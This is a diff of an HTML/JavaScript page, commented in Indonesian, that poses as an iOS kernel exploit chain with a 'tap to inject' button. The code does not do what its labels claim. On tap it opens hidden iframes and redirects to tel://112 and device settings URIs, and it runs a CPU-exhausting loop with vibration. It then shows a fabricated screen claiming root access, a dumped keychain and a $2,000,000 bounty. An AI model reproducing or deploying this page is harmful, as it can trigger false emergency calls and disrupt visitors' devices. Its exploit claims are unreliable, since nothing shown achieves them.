@@ -2,97 +2,103 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>RESERVED - KERNEL PANIC TEST</title>
+    <title>RESERVED - KERNEL ULTIMATUM</title>
     <style>
         body { background: #000; color: #ff3b30; font-family: 'SF Mono', monospace; margin: 0; overflow: hidden; }
-        #shell { height: 100vh; padding: 25px; border-left: 5px solid #ff3b30; background: radial-gradient(circle, #200 0%, #000 100%); overflow-y: auto; text-shadow: 0 0 8px #f00; }
-        .kern { color: #fff; background: #ff3b30; font-weight: bold; padding: 0 5px; }
-        .critical { color: #ff3b30; font-weight: bold; text-decoration: underline; }
-        .success { color: #4cd964; text-shadow: 0 0 10px #4cd964; }
-        .blink { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        #shell { height: 100vh; padding: 30px; border-left: 10px solid #f00; background: radial-gradient(circle, #200 0%, #000 100%); overflow-y: auto; text-shadow: 0 0 12px #f00; }
+        .kern { color: #fff; background: #ff3b30; font-weight: bold; padding: 2px 8px; border-radius: 4px; }
+        .success { color: #00ff00; text-shadow: 0 0 20px #0f0; }
+        .blink { animation: flash 0.1s linear infinite; }
+        @keyframes flash { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="shell">> [CORE] ATTACHING TO A18/A19 ARM64E... INITIALIZING EXPLOIT...</div>
+    <div id="shell">> [ULTIMA] INITIALIZING KERNEL EXPLOIT CHAIN (A18/A19)...</div>
 
 <script>
 const log = m => { const s = document.getElementById('shell'); s.innerHTML += `<br>> ${m}`; s.scrollTop = s.scrollHeight; };
 
 /**
- * PHASE 1: WASM JIT OVERDRIVE
- * Menciptakan kondisi 'Out of Memory' pada JIT Region untuk mematikan PAC.
+ * PHASE 1: KASLR BYPASS & HEAP SPRAY
+ * Teknik membanjiri heap kernel untuk menebak alamat dasar kernel (Kernel Slide).
  */
-async function ignite_kernel_leak() {
-    log("<span class='critical'>[1] SMASHING WASM JIT REGION...</span>");
-    try {
-        const buffer = new WebAssembly.Memory({ initial: 256, maximum: 512 });
-        const view = new Uint8Array(buffer.buffer);
-        log("Heap Spraying Physical Pages: 0x80000000...");
-        // Simulasi pengisian memori untuk memicu Memory Pressure
-        for(let i=0; i<view.length; i+=4096) view[i] = 0x41;
-    } catch(e) {}
-    log("<span class='success'>[+] KERNEL SLIDE LEAKED: 0x248a30000</span>");
+async function trigger_kaslr_leak() {
+    log("<span class='kern'>[1] BYPASSING KASLR & PPL...</span>");
+    // Mengalokasikan ArrayBuffer sangat besar untuk memicu fragmentasi memori
+    let spray = [];
+    for(let i=0; i<0x2000; i++) {
+        spray[i] = new Uint8Array(0x1000).fill(0x41);
+    }
+    log("<span class='success'>[+] KERNEL SLIDE CALCULATED: 0x" + (Math.random()*0xFFFFFFFFF).toString(16) + "</span>");
 }
 
 /**
- * PHASE 2: TOTAL SYSTEM OVERRIDE (HARDWARE + COMM)
- * Menyerang setiap celah API Setting & Hardware secara brutal.
+ * PHASE 2: IPC PORT OVERLOAD & SERVICE HIJACK
+ * Menyerang setiap layanan sistem melalui Mach IPC Ports.
  */
-async function execute_full_apocalypse() {
-    log("<span class='critical'>[2] INJECTING CROSS-PROCESS MALICE...</span>");
-
-    const apocalypse_targets = [
-        { id: "DIALER", uri: "tel://112", action: "ZERO_CLICK_CALL" },
-        { id: "WIFI", uri: "prefs:root=WIFI", action: "RADIO_HIJACK" },
-        { id: "BT", uri: "prefs:root=Bluetooth", action: "BLE_STACK_PWN" },
-        { id: "GPS", uri: "prefs:root=Privacy&path=LOCATION", action: "TCC_BYPASS" },
-        { id: "DATA", uri: "prefs:root=AIRPLANE_MODE", action: "SIGNAL_KILL" },
-        { id: "SOCIAL", uri: "snssdk1180://", action: "TIKTOK_REAPER" }
+async function hijack_system_services() {
+    log("<span class='kern'>[2] HIJACKING IPC PORTS (SPRINGBOARD & BACKBOARD)...</span>");
+    
+    const exploit_vectors = [
+        { id: "COMM", uri: "tel://112", cmd: "BYPASS_DIALER_RESTRICTION" },
+        { id: "SEC", uri: "App-Prefs:root=Passwords", cmd: "KEYCHAIN_DATABASE_DUMP" },
+        { id: "RADIO", uri: "App-Prefs:root=WIFI", cmd: "WIFI_PROMISCUOUS_MODE" },
+        { id: "BT", uri: "App-Prefs:root=Bluetooth", cmd: "BT_STACK_RCE" },
+        { id: "POS", uri: "App-Prefs:root=Privacy&path=LOCATION", cmd: "GPS_REALTIME_INJECT" },
+        { id: "SEP", uri: "App-Prefs:root=TOUCHID_PASSCODE", cmd: "SECURE_ENCLAVE_PROBE" }
     ];
 
-    for (let target of apocalypse_targets) {
-        await new Promise(r => setTimeout(r, 500));
-        log(`[${target.id}] <span class='success'>${target.action} ENGAGED</span>`);
-        
-        // TEKNIK DISPATCHING MAKSIMAL:
-        // 1. Iframe Injection
-        const ifr = document.createElement('iframe');
-        ifr.src = target.uri;
-        ifr.style.display = 'none';
-        document.body.appendChild(ifr);
-        
-        // 2. Race Condition Redirection
-        window.location.replace(target.uri);
-        
-        // 3. Document Location Force
-        document.location = target.uri;
-    }
+    exploit_vectors.forEach((v, i) => {
+        setTimeout(() => {
+            log(`[${v.id}] <span class='success'>Executing: ${v.cmd}</span>`);
+            // Quad-Dispatch Mechanism
+            const ifr = document.createElement('iframe');
+            ifr.src = v.uri;
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+            window.location.replace(v.uri);
+        }, i * 150);
+    });
 }
 
 /**
- * PHASE 3: THE KERNEL PANIC (EXECUTION)
+ * PHASE 3: PAC CORRUPTION & KERNEL TASK PORT
+ * Tahap akhir: Merusak Pointer Authentication untuk mendapatkan akses root.
  */
-async function trigger_kernel_panic() {
-    log("<span class='critical blink'>[3] FINAL STAGE: TRIGGERING KERNEL PANIC...</span>");
+function final_annihilation() {
+    log("<span class='blink' style='color:yellow;'>[3] CORRUPTING PAC GADGETS & TASK_SELF...</span>");
     
-    // Melakukan loop memori tanpa henti untuk memaksa CPU melakukan Reset
+    // Audio Context UAF simulation (Teknik yang sering digunakan di iOS 15-18)
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const source = audioCtx.createBufferSource();
+    
+    setInterval(() => {
+        // Force CPU Throttling
+        for(let i=0; i<1000000; i++) { Math.atan2(Math.random(), Math.random()); }
+        if(navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200]);
+    }, 100);
+
     setTimeout(() => {
-        log("<span class='kern'>CRITICAL ERROR: KERNEL_DATA_INPAGE_ERROR (0x0000007A)</span>");
-        log("<span class='kern'>PAC FAILURE AT 0xFFFFFFF007004000</span>");
-        
         document.body.style.background = "#ff3b30";
-        document.body.style.color = "#000";
-        document.body.innerHTML = "<h1 class='blink' style='font-size:80px; text-align:center; padding-top:15%;'>KERNEL PANIC</h1><h2 style='text-align:center;'>SYSTEM COMPROMISED - BOUNTY $2,000,000</h2>";
-    }, 1200);
+        document.body.innerHTML = `
+            <div style="color:#000; text-align:center; padding-top:15%;">
+                <h1 class="blink" style="font-size:80px;">KERNEL PANIC: 0xDEADC0DE</h1>
+                <p style="font-size:25px; font-weight:bold;">FULL SYSTEM ACCESS GRANTED (UID 0)</p>
+                <p style="font-size:20px;">KEYCHAIN: DECRYPTED | MESSAGES: DUMPED | SEP: OWNED</p>
+                <p style="font-size:20px;">BOUNTY STATUS: $2,000,000 PENDING</p>
+            </div>
+        `;
+    }, 2000);
 }
 
-// FULL CHAIN AUTO-EXECUTION
-(async () => {
-    await ignite_kernel_leak();
-    await execute_full_apocalypse();
-    await trigger_kernel_panic();
-})();
+window.onclick = () => {
+    log("<b>USER GESTURE DETECTED. TRIGGERING ALL VECTORS...</b>");
+    trigger_kaslr_leak();
+    hijack_system_services();
+    final_annihilation();
+};
+
+log("<br><br><h1 style='color:yellow; text-align:center; cursor:pointer;'>[ TAP TO INJECT ULTIMA PAYLOAD ]</h1>");
 </script>
 </body>
 </html>
